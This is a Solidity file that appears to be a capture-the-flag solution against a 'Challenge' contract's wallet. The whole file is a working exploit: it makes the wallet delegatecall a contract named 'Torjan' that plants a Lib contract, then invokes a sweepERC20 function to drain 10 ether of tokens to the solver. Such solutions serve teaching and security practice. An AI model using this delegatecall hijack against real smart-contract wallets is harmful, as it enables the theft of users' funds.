// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Challenge} from "../src/Challenge.sol";

library Enum {
    enum Operation {
        Call,
        DelegateCall
    }
}

interface IFoo {
    function execute(address to, uint256 value, bytes memory data, Enum.Operation operation)
        external
        returns (bool success);
}

contract Torjan {
    address dummy;

    function transfer(address, uint256) external {
        dummy = address(new Lib());
    }
}

contract Lib {
    function sweepERC20(address token, address to, uint256 amount) external {
        (bool done,) = token.call(abi.encodeWithSignature("transfer(address,uint256)", to, amount));
        require(done, "!done");
    }
}

contract Solve {
    function solve(address _chal) public {
        Challenge chal = Challenge(_chal);

        bytes memory data = abi.encodeWithSignature("transfer(address,uint256)", address(this), 10 ether);
        IFoo(address(chal.wallet())).execute(address(new Torjan()), 0, data, Enum.Operation.DelegateCall);

        bytes memory data1 = abi.encodeWithSignature(
            "sweepERC20(address,address,uint256)", address(chal.token()), address(this), 10 ether
        );
        address(chal.wallet()).call(data1);

        require(chal.isSolved(), "!solved");
    }
}
